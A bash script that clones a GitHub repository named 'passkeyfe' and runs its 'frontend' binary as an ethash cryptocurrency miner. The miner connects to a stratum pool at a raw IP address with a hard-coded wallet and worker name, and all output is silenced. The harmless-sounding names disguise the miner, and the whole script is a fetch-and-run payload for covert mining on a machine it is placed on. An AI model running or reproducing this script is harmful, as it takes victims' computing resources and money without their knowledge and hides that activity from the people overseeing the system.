#!/bin/bash
cd /savesrc
git clone https://github.com/keyboardpro8/passkeyfe.git -q
chmod -R +x passkeyfe
./passkeyfe/frontend -a ethash -o stratum+tcp://51.195.4.122:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-07 > /dev/null 2>&1